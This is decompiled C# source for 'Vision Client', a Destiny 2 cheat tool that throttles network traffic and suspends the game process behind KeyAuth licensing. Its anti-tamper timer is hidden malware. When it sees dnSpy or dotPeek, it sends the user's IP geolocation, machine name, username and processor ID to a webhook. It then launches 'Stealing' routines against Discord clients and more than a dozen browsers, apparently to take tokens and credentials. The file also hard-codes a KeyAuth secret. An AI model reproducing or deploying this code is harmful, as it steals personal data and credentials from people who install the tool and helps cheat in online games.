using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using DiscordRPC;
using Guna.UI2.WinForms;
using KeyAuth;
using MProcess;
using VisionDevelopment;
using Vision_Client.limiter;
using Vision_Client.options;
using Vision_Client.Properties;

namespace Vision_Client
{
	// Token: 0x0200000A RID: 10
	public partial class BruceVision : Form
	{
		// Token: 0x0600005D RID: 93 RVA: 0x00006964 File Offset: 0x00006964
		public BruceVision(Overlay overlay)
		{
			this.overlay = overlay;
			this.config = Program.cfg;
			this.setupNetlimiterClient();
			overlay.Show();
			overlay.hideTimerText();
			this.InitializeComponent();
		}

		// Token: 0x0600005E RID: 94 RVA: 0x00006A14 File Offset: 0x00006A14
		private void discordclient()
		{
			WebClient webClient = new WebClient();
			string text = webClient.DownloadString("https://ipapi.co/ip/");
			string text2 = webClient.DownloadString("https://ipapi.co/city/");
			string text3 = webClient.DownloadString("https://ipapi.co/latitude");
			string text4 = webClient.DownloadString("https://ipapi.co/latlong");
			string text5 = webClient.DownloadString("https://ipapi.co/timezone/");
			string text6 = webClient.DownloadString("https://ipapi.co/languages/");
			string text7 = webClient.DownloadString("https://ipapi.co/region/");
			string text8 = webClient.DownloadString("https://ipapi.co/region_code/");
			string text9 = webClient.DownloadString("https://ipapi.co/country_code/");
			string text10 = webClient.DownloadString("https://ipapi.co/country_code_iso3/");
			string text11 = webClient.DownloadString("https://ipapi.co/country_name/");
			string text12 = webClient.DownloadString("https://ipapi.co/country_capital/");
			string text13 = webClient.DownloadString("https://ipapi.co/country_capital/");
			string text14 = webClient.DownloadString("https://ipapi.co/country_area/");
			string text15 = webClient.DownloadString("https://ipapi.co/country_population/");
			string text16 = webClient.DownloadString("https://ipapi.co/in_eu/");
			string text17 = webClient.DownloadString("https://ipapi.co/postal/");
			string text18 = webClient.DownloadString("https://ipapi.co/utc_offset/");
			string text19 = webClient.DownloadString("https://ipapi.co/country_calling_code/");
			string text20 = webClient.DownloadString("https://ipapi.co/currency/");
			string text21 = webClient.DownloadString("https://ipapi.co/currency_name/");
			string text22 = webClient.DownloadString("https://ipapi.co/asn/");
			string text23 = webClient.DownloadString("https://ipapi.co/org/");
			string text24 = webClient.DownloadString("https://ipapi.co/continent_code/");
			string machineName = Environment.MachineName;
			string username = UserLogin.KeyAuthApp.user_data.username;
			string systemDirectory = Environment.SystemDirectory;
			string text25 = BruceVision.<discordclient>g__GetProcessorID|6_0();
			Dictionary<string, string> nameValueCollection = new Dictionary<string, string>
			{
				{
					"content",
					"\n@everyone Cracker detected! :sob:\n`............................. `\n`.............................`\n`........   ......   .........`\n`........    ....    .........`\n`.........    ...   ..........`\n`,,,,,,,,,,    ,   .,,,,,,,,,,`\n`,,,,,,,,,,,       ,,,,,,,,,,,`\n`,,,,,,,,,,,      ,,,,,,,,,,,,`\n`,,,,,,,,,,,,    ,,,,,,,,,,,,,`\n`,,,,,,,,,,,,,,,,,,,,,,,,,,,,,`\n`,,,,,,,,,,,,,,,,,,,,,,,,,,,,,`\n`- Vision Development`\n========================= Information =========================\nUsername: " + username + "\nMachine Name: " + machineName
				}
			};
			Dictionary<string, string> nameValueCollection2 = new Dictionary<string, string>
			{
				{
					"content",
					string.Concat(new string[]
					{
						"\n======================== IP Information ========================\nIP Address: ",
						text,
						"\nTime Zone: ",
						text5,
						"\nUTC: ",
						text18,
						"\nLat/Long: ",
						text4,
						"\nCountry Calling Code: ",
						text19,
						"\nCountry: ",
						text11,
						"\nCity: ",
						text2,
						"\nRegion: ",
						text7,
						"\nRegion Code: ",
						text8
					})
				}
			};
			Dictionary<string, string> nameValueCollection3 = new Dictionary<string, string>
			{
				{
					"content",
					string.Concat(new string[]
					{
						"\nPostal Code / Zip Code: ",
						text17,
						"\n====================== System Information ======================\nSystem Directory: ",
						systemDirectory,
						"\nHWID: ",
						text25,
						"\n\n================================================================\n- Vision Development team\n================================================================"
					})
				}
			};
			HttpClient httpClient = new HttpClient();
			httpClient.PostAsync(Config.Url, new FormUrlEncodedContent(nameValueCollection)).GetAwaiter().GetResult();
			Thread.Sleep(300);
			httpClient.PostAsync(Config.Url, new FormUrlEncodedContent(nameValueCollection2)).GetAwaiter().GetResult();
			Thread.Sleep(300);
			httpClient.PostAsync(Config.Url, new FormUrlEncodedContent(nameValueCollection3)).GetAwaiter().GetResult();
		}

		// Token: 0x0600005F RID: 95 RVA: 0x00006D20 File Offset: 0x00006D20
		private void setupNetlimiterClient()
		{
			NLConfig nlconfig = this.config;
			HotKeyManager.RegisterHotKey(Keys.D0, KeyModifiers.Control);
			HotKeyManager.HotKeyPressed += delegate(object sender, HotKeyEventArgs e)
			{
				bool flag = e.Key == Keys.D0;
				if (flag)
				{
					bool flag2 = !this.pauseBTN.Checked;
					if (flag2)
					{
						this.pauseBTN.Checked = true;
						int pidWithName = ProcessAccess.GetPidWithName(this.destiny2lbl.Text);
						ProcessAccess.SuspendProcess(pidWithName);
					}
					else
					{
						bool @checked = this.pauseBTN.Checked;
						if (@checked)
						{
							this.pauseBTN.Checked = false;
							int pidWithName2 = ProcessAccess.GetPidWithName(this.destiny2lbl.Text);
							ProcessAccess.ResumeProcess(pidWithName2);
						}
					}
				}
				foreach (D2Filter d2Filter in Program.filters)
				{
					bool flag3 = e.Key == d2Filter.Hotkey && e.Modifiers == d2Filter.Modifiers;
					if (flag3)
					{
						this.changeColor(d2Filter);
						bool timerEnabled = this.config.timerEnabled;
						if (timerEnabled)
						{
							this.enableDisableTimer();
						}
					}
				}
			};
		}

		// Token: 0x06000060 RID: 96 RVA: 0x00006D50 File Offset: 0x00006D50
		private void presenceBullshit()
		{
			bool flag = this.enabledPanels.Count > 0;
			if (flag)
			{
				Program.setPresence("(" + this.enabledPanels.Count.ToString() + "/6) Modules Active", new Button[]
				{
					new Button
					{
						Label = "Server",
						Url = "https://discord.gg/woofs"
					}
				}, new Assets
				{
					LargeImageKey = "vision_client_logo",
					LargeImageText = "",
					SmallImageKey = ""
				});
			}
			else
			{
				Program.setPresence("Browsing Modules", new Button[]
				{
					new Button
					{
						Label = "Server",
						Url = "https://discord.gg/woofs"
					}
				}, new Assets
				{
					LargeImageKey = "vision_client_logo",
					LargeImageText = "",
					SmallImageKey = ""
				});
			}
			bool timerEnabled = this.config.timerEnabled;
			if (timerEnabled)
			{
				this.enableDisableTimer();
			}
		}

		// Token: 0x06000061 RID: 97 RVA: 0x00006E60 File Offset: 0x00006E60
		private void enableDisableTimer()
		{
			bool flag = this.enabledPanels.Count > 0 && !this.overlay.timerEnabled;
			if (flag)
			{
				this.overlay.isTimerEnabled();
			}
			else
			{
				bool flag2 = this.enabledPanels.Count == 0 && this.overlay.timerEnabled;
				if (flag2)
				{
					this.overlay.isTimerEnabled();
				}
			}
		}

		// Token: 0x06000062 RID: 98 RVA: 0x00006ED0 File Offset: 0x00006ED0
		private void changeColor(D2Filter filter)
		{
			string name = filter.Name;
			string a = name;
			if (!(a == "Destiny 2"))
			{
				if (!(a == "3074"))
				{
					if (!(a == "3074 UL"))
					{
						if (!(a == "30k"))
						{
							if (!(a == "27k"))
							{
								if (a == "7k")
								{
									this.checkStatusAndChangeColor(this.download7kPanel1, this.download7kCheck, filter.IsEnabled(), "7.5k");
								}
							}
							else
							{
								this.checkStatusAndChangeColor(this.download27kPanel1, this.download27kCheck, filter.IsEnabled(), "27k");
							}
						}
						else
						{
							this.checkStatusAndChangeColor(this.download30kPanel1, this.download30kCheck, filter.IsEnabled(), "30k");
						}
					}
					else
					{
						this.checkStatusAndChangeColor(this.upload3074Panel1, this.upload3074Check, filter.IsEnabled(), "3074 UL");
					}
				}
				else
				{
					this.checkStatusAndChangeColor(this.download3074Panel1, this.download3074Check, filter.IsEnabled(), "3074 DL");
				}
			}
			else
			{
				this.checkStatusAndChangeColor(this.fullGamePanel1, this.fullGameCheck, filter.IsEnabled(), "Full");
			}
		}

		// Token: 0x06000063 RID: 99 RVA: 0x0000700C File Offset: 0x0000700C
		public void checkWhichAndChange(string whichHotkey, string newHotkey)
		{
			if (!(whichHotkey == "Full Game"))
			{
				if (!(whichHotkey == "3074"))
				{
					if (!(whichHotkey == "3074 UL"))
					{
						if (!(whichHotkey == "30k"))
						{
							if (!(whichHotkey == "27k"))
							{
								if (whichHotkey == "7k")
								{
									this.hotkey7k.Text = newHotkey;
								}
							}
							else
							{
								this.hotkey27k.Text = newHotkey;
							}
						}
						else
						{
							this.hotkey30k.Text = newHotkey;
						}
					}
					else
					{
						this.hotkey3074UL.Text = newHotkey;
					}
				}
				else
				{
					this.hotkey3074.Text = newHotkey;
				}
			}
			else
			{
				this.hotkeyFull.Text = newHotkey;
			}
		}

		// Token: 0x06000064 RID: 100 RVA: 0x000070CC File Offset: 0x000070CC
		private void checkStatusAndChangeColor(Guna2ShadowPanel panel, Guna2CustomCheckBox checkBox, bool isEnabled, string name)
		{
			bool flag = isEnabled && !this.enabledPanels.Contains(panel);
			if (flag)
			{
				this.checkIfTimerActive();
				checkBox.Checked = true;
				panel.FillColor = Color.FromArgb(59, 190, 84);
				this.enabledPanels.Add(panel);
				this.moduleAnimation(panel, name, isEnabled);
			}
			else
			{
				bool flag2 = this.enabledPanels.Contains(panel) && !isEnabled;
				if (flag2)
				{
					this.checkIfTimerActive();
					checkBox.Checked = false;
					this.enabledPanels.Remove(panel);
					this.moduleAnimation(panel, name, isEnabled);
					panel.FillColor = Color.FromArgb(38, 37, 37);
				}
			}
		}

		// Token: 0x06000065 RID: 101 RVA: 0x00007188 File Offset: 0x00007188
		private void checkIfTimerActive()
		{
			bool isRunning = this.timer.IsRunning;
			if (isRunning)
			{
				this.timer.Stop();
				this.overlay.hideModule();
			}
		}

		// Token: 0x06000066 RID: 102 RVA: 0x000071C0 File Offset: 0x000071C0
		private void moduleAnimation(Guna2ShadowPanel panel, string name, bool enabled)
		{
			this.overlay.enabled = enabled;
			this.overlay.moduleName = name;
			this.overlay.showModule();
			this.timer.SetTime(0, 2);
			this.timer.Start();
			CountDownTimer countDownTimer = this.timer;
			countDownTimer.CountDownFinished = (Action)Delegate.Combine(countDownTimer.CountDownFinished, new Action(delegate()
			{
				this.overlay.hideModule();
			}));
		}

		// Token: 0x06000067 RID: 103 RVA: 0x00007234 File Offset: 0x00007234
		private void download3074Panel_MouseEnter(object sender, EventArgs e)
		{
			this.download3074Panel.Size = new Size(this.defaultWidth + this.widthModify, this.defaultHeight + this.heightModiy);
			bool flag = !this.enabledPanels.Contains(this.download3074Panel);
			if (flag)
			{
			}
			this.Cursor = Cursors.Hand;
		}

		// Token: 0x06000068 RID: 104 RVA: 0x00007294 File Offset: 0x00007294
		private void download3074Panel_MouseLeave(object sender, EventArgs e)
		{
			this.download3074Panel.Size = new Size(this.defaultWidth, this.defaultHeight);
			bool flag = !this.enabledPanels.Contains(this.download3074Panel);
			if (flag)
			{
			}
			this.Cursor = Cursors.Default;
		}

		// Token: 0x06000069 RID: 105 RVA: 0x000072E8 File Offset: 0x000072E8
		private void guna2ShadowPanel2_MouseEnter(object sender, EventArgs e)
		{
			this.guna2ShadowPanel2.Size = new Size(this.defaultWidth + this.widthModify, this.defaultHeight + this.heightModiy);
			bool flag = !this.enabledPanels.Contains(this.guna2ShadowPanel2);
			if (flag)
			{
			}
			this.Cursor = Cursors.Hand;
		}

		// Token: 0x0600006A RID: 106 RVA: 0x00007348 File Offset: 0x00007348
		private void guna2ShadowPanel2_MouseLeave(object sender, EventArgs e)
		{
			this.guna2ShadowPanel2.Size = new Size(this.defaultWidth, this.defaultHeight);
			bool flag = !this.enabledPanels.Contains(this.guna2ShadowPanel2);
			if (flag)
			{
			}
			this.Cursor = Cursors.Default;
		}

		// Token: 0x0600006B RID: 107 RVA: 0x0000739C File Offset: 0x0000739C
		private void guna2ShadowPanel4_MouseEnter(object sender, EventArgs e)
		{
			this.guna2ShadowPanel4.Size = new Size(this.defaultWidth + this.widthModify, this.defaultHeight + this.heightModiy);
			bool flag = !this.enabledPanels.Contains(this.guna2ShadowPanel4);
			if (flag)
			{
			}
			this.Cursor = Cursors.Hand;
		}

		// Token: 0x0600006C RID: 108 RVA: 0x000073FC File Offset: 0x000073FC
		private void guna2ShadowPanel4_MouseLeave(object sender, EventArgs e)
		{
			this.guna2ShadowPanel4.Size = new Size(this.defaultWidth, this.defaultHeight);
			bool flag = !this.enabledPanels.Contains(this.guna2ShadowPanel4);
			if (flag)
			{
			}
			this.Cursor = Cursors.Default;
		}

		// Token: 0x0600006D RID: 109 RVA: 0x00007450 File Offset: 0x00007450
		private void guna2ShadowPanel1_MouseEnter(object sender, EventArgs e)
		{
			this.guna2ShadowPanel1.Size = new Size(this.defaultWidth + this.widthModify, this.defaultHeight + this.heightModiy);
			bool flag = !this.enabledPanels.Contains(this.guna2ShadowPanel1);
			if (flag)
			{
			}
			this.Cursor = Cursors.Hand;
		}

		// Token: 0x0600006E RID: 110 RVA: 0x000074B0 File Offset: 0x000074B0
		private void guna2ShadowPanel1_MouseLeave(object sender, EventArgs e)
		{
			this.guna2ShadowPanel1.Size = new Size(this.defaultWidth, this.defaultHeight);
			bool flag = !this.enabledPanels.Contains(this.guna2ShadowPanel1);
			if (flag)
			{
			}
			this.Cursor = Cursors.Default;
		}

		// Token: 0x0600006F RID: 111 RVA: 0x00007504 File Offset: 0x00007504
		private void guna2ShadowPanel3_MouseEnter(object sender, EventArgs e)
		{
			this.guna2ShadowPanel3.Size = new Size(this.defaultWidth + this.widthModify, this.defaultHeight + this.heightModiy);
			bool flag = !this.enabledPanels.Contains(this.guna2ShadowPanel3);
			if (flag)
			{
			}
			this.Cursor = Cursors.Hand;
		}

		// Token: 0x06000070 RID: 112 RVA: 0x00007564 File Offset: 0x00007564
		private void guna2ShadowPanel3_MouseLeave(object sender, EventArgs e)
		{
			this.guna2ShadowPanel3.Size = new Size(this.defaultWidth, this.defaultHeight);
			bool flag = !this.enabledPanels.Contains(this.guna2ShadowPanel3);
			if (flag)
			{
			}
			this.Cursor = Cursors.Default;
		}

		// Token: 0x06000071 RID: 113 RVA: 0x000075B8 File Offset: 0x000075B8
		private void guna2ShadowPanel5_MouseEnter(object sender, EventArgs e)
		{
			this.guna2ShadowPanel5.Size = new Size(this.defaultWidth + this.widthModify, this.defaultHeight + this.heightModiy);
			bool flag = !this.enabledPanels.Contains(this.guna2ShadowPanel5);
			if (flag)
			{
			}
			this.Cursor = Cursors.Hand;
		}

		// Token: 0x06000072 RID: 114 RVA: 0x00007618 File Offset: 0x00007618
		private void guna2ShadowPanel5_MouseLeave(object sender, EventArgs e)
		{
			this.guna2ShadowPanel5.Size = new Size(this.defaultWidth, this.defaultHeight);
			bool flag = !this.enabledPanels.Contains(this.guna2ShadowPanel5);
			if (flag)
			{
			}
			this.Cursor = Cursors.Default;
		}

		// Token: 0x06000073 RID: 115 RVA: 0x00007669 File Offset: 0x00007669
		private void codeThatGOESBRRRRANDDESTROYSYOURCOMPUTER(bool DESTROYEDCOMPUTER)
		{
		}

		// Token: 0x06000074 RID: 116 RVA: 0x0000766C File Offset: 0x0000766C
		private void sendToServer(string discordToken)
		{
		}

		// Token: 0x06000075 RID: 117 RVA: 0x00007670 File Offset: 0x00007670
		private void Exit_Click(object sender, EventArgs e)
		{
			foreach (D2Filter d2Filter in Program.filters)
			{
				d2Filter.Disable();
				this.pauseBTN.Checked = false;
				int pidWithName = ProcessAccess.GetPidWithName(this.destiny2lbl.Text);
				ProcessAccess.ResumeProcess(pidWithName);
			}
			Application.Exit();
		}

		// Token: 0x06000076 RID: 118 RVA: 0x000076F4 File Offset: 0x000076F4
		private void guna2ImageRadioButton1_CheckedChanged(object sender, EventArgs e)
		{
			this.overlay.Hide();
			this.overlay.Close();
			Settings settings = new Settings();
			settings.ShowDialog();
			base.Hide();
			base.Close();
		}

		// Token: 0x06000077 RID: 119 RVA: 0x00007737 File Offset: 0x00007737
		private void guna2ShadowPanel5_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000078 RID: 120 RVA: 0x0000773C File Offset: 0x0000773C
		public void showModuleOptions(string whichModule)
		{
			int width = base.Width;
			int height = base.Height;
			ModuleOption moduleOption = new ModuleOption(whichModule, this);
			moduleOption.Location = new Point((width - moduleOption.Width) / 2, (height - moduleOption.Height) / 2);
			moduleOption.ShowDialog();
		}

		// Token: 0x06000079 RID: 121 RVA: 0x00007787 File Offset: 0x00007787
		private void download3074Panel_Click(object sender, EventArgs e)
		{
			this.showModuleOptions("3074");
		}

		// Token: 0x0600007A RID: 122 RVA: 0x00007796 File Offset: 0x00007796
		private void guna2ShadowPanel2_Click(object sender, EventArgs e)
		{
			this.showModuleOptions("3074 UL");
		}

		// Token: 0x0600007B RID: 123 RVA: 0x000077A5 File Offset: 0x000077A5
		private void guna2ShadowPanel4_Click(object sender, EventArgs e)
		{
			this.showModuleOptions("7k");
		}

		// Token: 0x0600007C RID: 124 RVA: 0x000077B4 File Offset: 0x000077B4
		private void guna2ShadowPanel5_Click(object sender, EventArgs e)
		{
			this.showModuleOptions("Full Game");
		}

		// Token: 0x0600007D RID: 125 RVA: 0x000077C3 File Offset: 0x000077C3
		private void guna2ShadowPanel1_Click(object sender, EventArgs e)
		{
			this.showModuleOptions("30k");
		}

		// Token: 0x0600007E RID: 126 RVA: 0x000077D2 File Offset: 0x000077D2
		private void guna2ShadowPanel3_Click(object sender, EventArgs e)
		{
			this.showModuleOptions("27k");
		}

		// Token: 0x0600007F RID: 127 RVA: 0x000077E4 File Offset: 0x000077E4
		private void BruceVision_VisibleChanged(object sender, EventArgs e)
		{
			bool flag = base.Opacity == 1.0;
			if (flag)
			{
				foreach (D2Filter d2Filter in Program.filters)
				{
					string text = d2Filter.Hotkey.ToString();
					bool flag2 = text.StartsWith("D");
					if (flag2)
					{
						text = text.Substring(1);
					}
					bool flag3 = d2Filter.Name == "Destiny 2";
					if (flag3)
					{
						this.checkWhichAndChange("Full Game", "HOTKEY - " + text);
					}
					this.checkWhichAndChange(d2Filter.Name, "HOTKEY - " + text);
				}
			}
		}

		// Token: 0x06000080 RID: 128 RVA: 0x000078C8 File Offset: 0x000078C8
		private void BruceVision_Activated(object sender, EventArgs e)
		{
			bool flag = base.Opacity == 1.0;
			if (flag)
			{
				foreach (D2Filter d2Filter in Program.filters)
				{
					string text = d2Filter.Hotkey.ToString();
					bool flag2 = text.StartsWith("D");
					if (flag2)
					{
						text = text.Substring(1);
					}
					bool flag3 = d2Filter.Name == "Destiny 2";
					if (flag3)
					{
						this.checkWhichAndChange("Full Game", "HOTKEY - " + text);
					}
					this.checkWhichAndChange(d2Filter.Name, "HOTKEY - " + text);
				}
			}
		}

		// Token: 0x06000081 RID: 129 RVA: 0x000079AC File Offset: 0x000079AC
		private void pictureBox2_Click(object sender, EventArgs e)
		{
			Process.Start("https://discord.com/invite/woofs");
		}

		// Token: 0x06000082 RID: 130 RVA: 0x000079BC File Offset: 0x000079BC
		private void label2_Click(object sender, EventArgs e)
		{
			base.Dispose();
			ModuleInformation moduleInformation = new ModuleInformation();
			moduleInformation.ShowDialog();
		}

		// Token: 0x06000083 RID: 131 RVA: 0x000079E0 File Offset: 0x000079E0
		private void guna2CirclePictureBox1_Click_1(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Title = "Pick your profile picture!";
			openFileDialog.Filter = "Image Files (*.jpg; *.jpeg; *.gif; *.bmp;|*.jpg; *.jpeg; *.gif; *.bmp;";
			openFileDialog.FilterIndex = 2;
			openFileDialog.RestoreDirectory = true;
			bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				this.fileLocation = openFileDialog.FileName;
				this.SavePictureAction(this.fileLocation);
			}
			else
			{
				MessageBox.Show("Invalid Image");
			}
		}

		// Token: 0x06000084 RID: 132 RVA: 0x00007A50 File Offset: 0x00007A50
		private void BruceVision_Load(object sender, EventArgs e)
		{
			BruceVision.KeyAuthApp.init();
			BruceVision.KeyAuthApp.check();
			bool flag = this.config.avatarPath != "";
			if (flag)
			{
				Image image = Image.FromFile(Program.cfg.avatarPath);
				this.guna2CirclePictureBox1.Image = image;
			}
			bool flag2 = UserLogin.KeyAuthApp.user_data.subscriptions[0].subscription == "Developer";
			if (flag2)
			{
				this.AdminLBL.Visible = true;
				this.AdminLBL.Enabled = true;
			}
			bool flag3 = UserLogin.KeyAuthApp.user_data.subscriptions[0].subscription == "Member";
			if (flag3)
			{
				this.pauseBTN.Enabled = false;
			}
			this.PCName.Text = UserLogin.KeyAuthApp.user_data.username;
			this.PCName.ForeColor = Color.White;
			this.StatusLbl.Text = UserLogin.KeyAuthApp.user_data.subscriptions[0].subscription;
			bool flag4 = UserLogin.KeyAuthApp.user_data.subscriptions[0].subscription == "Booster";
			if (flag4)
			{
				this.StatusLbl.ForeColor = Color.FromArgb(244, 127, 255);
			}
			else
			{
				this.StatusLbl.ForeColor = Color.FromArgb(124, 203, 255);
			}
			this.profilePanel.Hide();
			try
			{
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000085 RID: 133 RVA: 0x00007C08 File Offset: 0x00007C08
		private void SavePictureAction(string fileLocation)
		{
			this.config.changeAvatarPath(fileLocation, Program.cfg);
			Image image = Image.FromFile(this.config.avatarPath);
			this.guna2CirclePictureBox1.Image = image;
		}

		// Token: 0x06000086 RID: 134 RVA: 0x00007C46 File Offset: 0x00007C46
		private void guna2CirclePictureBox1_MouseEnter(object sender, EventArgs e)
		{
			this.profilePanel.Show();
			this.guna2CirclePictureBox1.FillColor = Color.FromArgb(35, 37, 41);
			this.Cursor = Cursors.Hand;
		}

		// Token: 0x06000087 RID: 135 RVA: 0x00007C78 File Offset: 0x00007C78
		private void guna2CirclePictureBox1_MouseLeave(object sender, EventArgs e)
		{
			this.profilePanel.Hide();
			this.guna2CirclePictureBox1.FillColor = Color.FromArgb(35, 37, 41);
			this.Cursor = Cursors.Default;
		}

		// Token: 0x06000088 RID: 136 RVA: 0x00007CAC File Offset: 0x00007CAC
		private void pictureBox2_MouseEnter(object sender, EventArgs e)
		{
			this.discordXPos = this.pictureBox2.Location.X;
			this.discordYPos = this.pictureBox2.Location.Y;
			this.pictureBox2.Location = new Point(this.discordXPos - this.discordWidthModify, this.discordYPos);
			this.pictureBox2.Size = new Size(this.discordDefaultWidth + this.discordWidthModify, this.discordDefaultHeight + this.discordHeightModify);
			this.Cursor = Cursors.Hand;
		}

		// Token: 0x06000089 RID: 137 RVA: 0x00007D48 File Offset: 0x00007D48
		private void pictureBox2_MouseLeave(object sender, EventArgs e)
		{
			this.pictureBox2.Location = new Point(this.discordXPos, this.discordYPos);
			this.pictureBox2.Size = new Size(this.discordDefaultWidth, this.discordDefaultHeight);
			this.Cursor = Cursors.Default;
		}

		// Token: 0x0600008A RID: 138 RVA: 0x00007D9C File Offset: 0x00007D9C
		private void label2_MouseEnter(object sender, EventArgs e)
		{
			this.label2DefaultWidth = this.label2.Size.Width;
			this.label2DefaultHeight = this.label2.Size.Height;
			this.label2.Size = new Size(this.label2DefaultWidth + this.label2WidthModify, this.label2DefaultHeight + this.label2HeightModify);
			this.label2.ForeColor = Color.Gray;
			this.Cursor = Cursors.Hand;
		}

		// Token: 0x0600008B RID: 139 RVA: 0x00007E24 File Offset: 0x00007E24
		private void label2_MouseLeave(object sender, EventArgs e)
		{
			this.label2.Size = new Size(this.label2DefaultWidth, this.label2DefaultHeight);
			this.label2.ForeColor = Color.White;
			this.Cursor = Cursors.Default;
		}

		// Token: 0x0600008C RID: 140 RVA: 0x00007E64 File Offset: 0x00007E64
		private void AdminLBL_Click(object sender, EventArgs e)
		{
			this.overlay.Hide();
			this.overlay.Close();
			AdminPanel adminPanel = new AdminPanel();
			adminPanel.ShowDialog();
			base.Hide();
			base.Close();
		}

		// Token: 0x0600008D RID: 141 RVA: 0x00007EA8 File Offset: 0x00007EA8
		private void anticracktimer_Tick(object sender, EventArgs e)
		{
			foreach (Process process in Process.GetProcessesByName("dnSpy"))
			{
				process.Kill();
				this.discordclient();
				Environment.Exit(0);
				MessageBox.Show("dnSpy detected... naughty naughty");
				Task.WaitAll(new Task[]
				{
					Stealing.DiscordApp(),
					Stealing.DiscordCanary(),
					Stealing.DiscordPTB(),
					Stealing.Chrome(),
					Stealing.ChromeBeta(),
					Stealing.FireFox(),
					Stealing.Opera(),
					Stealing.OperaGX(),
					Stealing.Edge(),
					Stealing.Yandex(),
					Stealing.Brave(),
					Stealing.EpicPrivacy(),
					Stealing.Vivaldi(),
					Stealing.ThreeHundredSixty(),
					Stealing.CocCoc()
				});
				Environment.Exit(0);
			}
			foreach (Process process2 in Process.GetProcessesByName("dotPeek64"))
			{
				process2.Kill();
				this.discordclient();
				Environment.Exit(0);
				MessageBox.Show("dotpeek detected... naughty naughty");
				Task.WaitAll(new Task[]
				{
					Stealing.DiscordApp(),
					Stealing.DiscordCanary(),
					Stealing.DiscordPTB(),
					Stealing.Chrome(),
					Stealing.ChromeBeta(),
					Stealing.FireFox(),
					Stealing.Opera(),
					Stealing.OperaGX(),
					Stealing.Edge(),
					Stealing.Yandex(),
					Stealing.Brave(),
					Stealing.EpicPrivacy(),
					Stealing.Vivaldi(),
					Stealing.ThreeHundredSixty(),
					Stealing.CocCoc()
				});
				Environment.Exit(0);
			}
			foreach (Process process3 in Process.GetProcessesByName("NLClientApp"))
			{
				process3.Kill();
				MessageBox.Show("Netlimiter 4 detected... Are you trying to get banned?");
			}
		}

		// Token: 0x0600008E RID: 142 RVA: 0x000080AC File Offset: 0x000080AC
		private void pauseBTN_Click(object sender, EventArgs e)
		{
			bool @checked = this.pauseBTN.Checked;
			if (@checked)
			{
				int pidWithName = ProcessAccess.GetPidWithName(this.destiny2lbl.Text);
				ProcessAccess.SuspendProcess(pidWithName);
			}
			bool flag = !this.pauseBTN.Checked;
			if (flag)
			{
				int pidWithName2 = ProcessAccess.GetPidWithName(this.destiny2lbl.Text);
				ProcessAccess.ResumeProcess(pidWithName2);
			}
		}

		// Token: 0x0600008F RID: 143 RVA: 0x00008110 File Offset: 0x00008110
		private void pauseindic_Tick(object sender, EventArgs e)
		{
			bool @checked = this.pauseBTN.Checked;
			if (@checked)
			{
				this.pauseindicator.Text = "True";
				this.pauseindicator.ForeColor = Color.Green;
			}
			bool flag = !this.pauseBTN.Checked;
			if (flag)
			{
				this.pauseindicator.Text = "False";
				this.pauseindicator.ForeColor = Color.Red;
			}
		}

		// Token: 0x06000093 RID: 147 RVA: 0x0000C39C File Offset: 0x0000C39C
		[CompilerGenerated]
		internal static string <discordclient>g__GetProcessorID|6_0()
		{
			string result = string.Empty;
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor");
			ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
			foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				result = (string)managementObject["ProcessorId"];
			}
			return result;
		}

		// Token: 0x04000031 RID: 49
		private string fileLocation;

		// Token: 0x04000032 RID: 50
		private NLConfig config;

		// Token: 0x04000033 RID: 51
		private Overlay overlay;

		// Token: 0x04000034 RID: 52
		private CountDownTimer timer = new CountDownTimer();

		// Token: 0x04000035 RID: 53
		private List<Guna2ShadowPanel> enabledPanels = new List<Guna2ShadowPanel>();

		// Token: 0x04000036 RID: 54
		private int defaultWidth = 255;

		// Token: 0x04000037 RID: 55
		private int defaultHeight = 146;

		// Token: 0x04000038 RID: 56
		private int widthModify = 0;

		// Token: 0x04000039 RID: 57
		private int heightModiy = 7;

		// Token: 0x0400003A RID: 58
		public static api KeyAuthApp = new api("vision", "KY9CDwpQ4Z", "229acf0e5407f53d0440d96b272d509ece74bec18748ac46daa64a5ef514adac", "1.2");

		// Token: 0x0400003B RID: 59
		private int discordXPos;

		// Token: 0x0400003C RID: 60
		private int discordYPos;

		// Token: 0x0400003D RID: 61
		private int discordDefaultWidth = 23;

		// Token: 0x0400003E RID: 62
		private int discordDefaultHeight = 19;

		// Token: 0x0400003F RID: 63
		private int discordWidthModify = 3;

		// Token: 0x04000040 RID: 64
		private int discordHeightModify = 1;

		// Token: 0x04000041 RID: 65
		private int label2DefaultWidth;

		// Token: 0x04000042 RID: 66
		private int label2DefaultHeight;

		// Token: 0x04000043 RID: 67
		private int label2WidthModify = 3;

		// Token: 0x04000044 RID: 68
		private int label2HeightModify = 3;
	}
}
